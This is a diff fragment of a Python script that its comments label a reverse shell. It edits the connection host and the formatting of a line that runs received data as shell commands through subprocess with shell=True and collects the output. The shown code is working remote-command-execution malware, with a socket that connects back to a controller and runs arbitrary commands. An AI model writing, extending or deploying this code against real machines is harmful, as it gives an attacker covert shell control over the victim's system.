@@ -6,7 +6,7 @@ import subprocess
 # reverse shell, target connects to us
 # this connects to the server
 
-host = '255.255.255.0' # IP address
+host = socket.gethostbyname(socket.gethostname())
 port = 9999 # don't choose a common one
 s = socket.socket()
 s.connect((host, port))
@@ -18,7 +18,7 @@ while True:
 
 	# if there is text, send to normal stream
 	if len(data) > 0:
-		cmd = subprocess.Popen(data[:].decode('utf-8'), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+		cmd = subprocess.Popen(data[:].decode('utf-8'), shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE)
 		# want string and byte for human and computer readability
 		output_bytes = cmd.stdout.read() + cmd.stderr.read()
 		output_str = str(output_bytes, 'utf-8')
